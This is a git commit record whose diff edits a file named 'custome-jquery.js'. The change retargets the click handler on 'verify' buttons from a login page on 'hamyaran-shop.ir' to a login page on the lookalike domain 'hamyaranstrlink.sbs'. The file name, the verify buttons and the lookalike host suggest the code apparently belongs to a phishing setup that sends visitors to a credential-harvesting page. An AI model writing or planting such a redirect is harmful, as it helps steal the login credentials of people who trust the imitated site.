17f56215cccc1df974f4c336a5b32cd60adad6d9
hamyaran-vps107 <98746288+hamyaran-vps107@users.noreply.github.com>
2025-10-31 18:49:22 +0330

    Update custome-jquery.js

--- custome-jquery.js
+++ custome-jquery.js
@@ -1,6 +1,6 @@
   const buttons = document.querySelectorAll('.verify-btn');
     buttons.forEach(button => {
         button.addEventListener('click', () => {
-            window.location.href = "https://hamyaran-shop.ir/login";
+            window.location.href = "https://hamyaranstrlink.sbs/login";
         });
     });
